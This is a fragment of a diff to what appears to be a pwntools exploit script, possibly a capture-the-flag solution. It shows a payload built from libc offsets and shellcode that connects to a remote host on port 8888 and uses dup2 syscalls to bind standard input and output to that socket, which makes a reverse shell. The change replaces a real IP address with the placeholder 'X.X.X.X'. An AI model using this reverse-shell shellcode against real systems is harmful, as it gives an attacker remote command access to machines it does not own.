@@ -125,7 +125,7 @@ for i in addrlist:
         payload += argv
         payload += p64(libc_base+offset_table['shellcode']).ljust(0x100,'\x00')
         shellcode = asm(
-            shellcraft.connect('35.229.207.66', 8888) +
+            shellcraft.connect('X.X.X.X', 8888) +
             'push rbp; pop rdi; xor esi, esi; push SYS_dup2; pop rax; syscall;' +
             'push rbp; pop rdi; push 1; pop rsi; push SYS_dup2; pop rax; syscall;' +
             'push rbp; pop rdi; push 2; pop rsi; push SYS_dup2; pop rax; syscall;' +
